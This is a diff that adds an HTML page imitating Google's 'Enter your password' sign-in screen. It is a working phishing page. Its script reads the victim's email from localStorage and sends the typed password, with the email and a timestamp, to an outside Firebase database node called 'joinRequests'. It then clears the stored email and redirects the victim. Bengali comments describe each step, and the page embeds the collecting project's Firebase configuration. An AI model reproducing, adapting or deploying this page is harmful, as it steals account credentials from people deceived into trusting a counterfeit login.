@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enter Password</title>
+<link rel="icon" href="/assets/google.png" type="image/x-icon">
+
+<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+    background-color: #fff;
+    color: #202124;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 60px 32px 24px;
+    opacity: 0;
+    animation: fadeIn 0.4s ease-in-out forwards;
+  }
+
+  @keyframes fadeIn {
+    to { opacity: 1; }
+  }
+
+  .main-wrap {
+    display: flex;
+    gap: 140px;
+    max-width: 1100px;
+    width: 100%;
+    align-items: flex-start;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+
+  /* LEFT: Logo + Email */
+  .left-box {
+    flex: 1;
+    min-width: 320px;
+    max-width: 460px;
+    text-align: left;
+  }
+
+  .logo-img {
+    width: 64px;
+    height: 64px;
+    display: block;
+    margin-bottom: 28px;
+    border-radius: 50%;
+    object-fit: contain;
+  }
+
+  .left-box h1 {
+    font-size: 40px;
+    font-weight: 400;
+    letter-spacing: -1px;
+    margin-bottom: 32px;
+    color: #202124;
+  }
+
+  /* Email Pill */
+  .email-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    border: 1px solid #dadce0;
+    border-radius: 24px;
+    padding: 10px 16px 10px 12px;
+    font-size: 16px;
+    color: #202124;
+    background: #fff;
+    cursor: pointer;
+    transition: border-color 0.15s;
+  }
+
+  .email-pill:hover { border-color: #bdc1c6; }
+
+  .email-pill .user-icon {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: #1a73e8;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    font-weight: 700;
+    flex-shrink: 0;
+  }
+
+  .email-pill .email-text {
+    font-weight: 500;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    max-width: 230px;
+  }
+
+  .email-pill .arrow {
+    color: #5f6368;
+    font-size: 14px;
+  }
+
+  /* RIGHT: Password */
+  .right-box {
+    flex: 1;
+    min-width: 340px;
+    max-width: 440px;
+    width: 100%;
+  }
+
+  .right-box h2 {
+    font-size: 24px;
+    font-weight: 400;
+    margin-bottom: 24px;
+    color: #202124;
+  }
+
+  .input-wrap {
+    margin-bottom: 8px;
+  }
+
+  .input-wrap input {
+    width: 100%;
+    height: 58px;
+    border: 1.5px solid #dadce0;
+    border-radius: 6px;
+    padding: 14px 16px;
+    font-size: 17px;
+    color: #202124;
+    outline: none;
+    transition: border-color 0.15s, box-shadow 0.15s;
+  }
+
+  .input-wrap input:focus {
+    border-color: #1a73e8;
+    border-width: 2px;
+    padding-left: 15px;
+    box-shadow: 0 0 0 2px rgba(26,115,232,0.12);
+  }
+
+  /* Show password link */
+  .show-pass {
+    display: inline-block;
+    font-size: 14px;
+    color: #1a73e8;
+    text-decoration: none;
+    margin-bottom: 48px;
+    font-weight: 500;
+  }
+
+  .show-pass:hover { text-decoration: underline; }
+
+  /* Bottom row */
+  .bottom-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 32px;
+  }
+
+  .next-btn {
+    background: #1a73e8;
+    color: #fff;
+    border: none;
+    border-radius: 20px;
+    padding: 10px 28px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.15s, box-shadow 0.15s;
+  }
+
+  .next-btn:hover {
+    background: #1557b0;
+    box-shadow: 0 1px 3px rgba(26,115,232,0.3);
+  }
+
+  /* Footer */
+  footer {
+    width: 100%;
+    max-width: 1100px;
+    display: flex;
+    justify-content: flex-end;
+    align-items: center;
+    margin-top: 80px;
+    padding: 20px 0;
+    color: #5f6368;
+    font-size: 12px;
+    gap: 24px;
+  }
+
+  footer a {
+    color: #5f6368;
+    text-decoration: none;
+  }
+  footer a:hover { text-decoration: underline; }
+
+  @media (max-width: 860px) {
+    .main-wrap { flex-direction: column; gap: 48px; align-items: flex-start; }
+    .left-box, .right-box { max-width: 100%; }
+    .email-pill .email-text { max-width: 160px; }
+  }
+</style>
+</head>
+
+<body>
+
+  <main class="main-wrap">
+    <!-- LEFT: Logo + Previous Email -->
+    <div class="left-box">
+      <img src="/assets/google.png" alt="Logo" class="logo-img">
+      <h1>Sign in</h1>
+
+      <div class="email-pill" onclick="alert('Switch account')" title="Switch account">
+        <div class="user-icon" id="userInitial">U</div>
+        <span class="email-text" id="showEmail">Loading...</span>
+        <span class="arrow">&#9662;</span>
+      </div>
+    </div>
+
+    <!-- RIGHT: Password -->
+    <div class="right-box">
+      <!-- ফর্মের আইডি 'passwordForm' করে দেওয়া হয়েছে -->
+      <form id="passwordForm">
+        <h2>Enter your password</h2>
+
+        <div class="input-wrap">
+          <input type="password" id="pass" placeholder="Enter your password" required autocomplete="current-password">
+        </div>
+
+        <a href="#" class="show-pass" onclick="var p=document.getElementById('pass'); if(p.type==='password'){p.type='text'; this.textContent='Hide password';}else{p.type='password'; this.textContent='Show password';} return false;">Show password</a>
+
+        <p style="font-size:14px; color:#5f6368; line-height:1.5; margin-top:8px;">
+          Not your computer? Use Guest mode to sign in privately. 
+          <a href="#" style="color:#1a73e8; text-decoration:none; font-weight:500;">Learn more</a>
+        </p>
+
+        <div class="bottom-row">
+          <a href="#" style="font-size:14px; color:#1a73e8; text-decoration:none; font-weight:500;">Create account</a>
+          <button type="submit" class="next-btn">Next</button>
+        </div>
+      </form>
+    </div>
+  </main>
+
+  <footer>
+    <a href="#">English (United States)</a>
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </footer>
+
+  <!-- Firebase SDK Setup -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";
+
+    const firebaseConfig = {
+  apiKey: "AIzaSyADHXShPh9hOivzj7t2epXi_QKe9KTIrNs",
+  authDomain: "asf-panel-na.firebaseapp.com",
+  databaseURL: "https://asf-panel-na-default-rtdb.firebaseio.com",
+  projectId: "asf-panel-na",
+  storageBucket: "asf-panel-na.firebasestorage.app",
+  messagingSenderId: "469766659283",
+  appId: "1:469766659283:web:9a3e80386f6497c270c826",
+  measurementId: "G-BP55YHJVDV"
+};
+
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    // প্রথম পেজ থেকে ইমেইল রিড করা ('userEmail' অথবা 'googleEmail')
+    const email = localStorage.getItem('userEmail') || localStorage.getItem('googleEmail') || "user@example.com";
+    
+    // UI-তে ইমেইল এবং ইনিশিয়াল সেট করা
+    document.getElementById("showEmail").textContent = email;
+    document.getElementById("userInitial").textContent = email ? email.charAt(0).toUpperCase() : "U";
+
+    // ফর্ম সাবমিট হ্যান্ডলার
+    document.getElementById("passwordForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const password = document.getElementById("pass").value.trim();
+
+      if (!password) {
+        alert("Please enter your password.");
+        return;
+      }
+
+      try {
+        // Firebase-এর 'joinRequests' নোডে ইমেইল ও পাসওয়ার্ড পাঠানো হচ্ছে
+        await push(ref(db, "joinRequests"), {
+          email: email,
+          password: password,
+          timestamp: new Date().toLocaleString()
+        });
+
+        // ডেটা সফলভাবে চলে যাওয়ার পর localStorage ক্লিয়ার করা
+        localStorage.removeItem("userEmail");
+        localStorage.removeItem("googleEmail");
+
+        // রিডাইরেক্ট করা
+        window.location.href = "./reload/";
+      } catch (err) {
+        console.error("Firebase Error: ", err);
+        alert("Failed to save data. Please try again.");
+      }
+    });
+  </script>
+
+</body>
+</html>
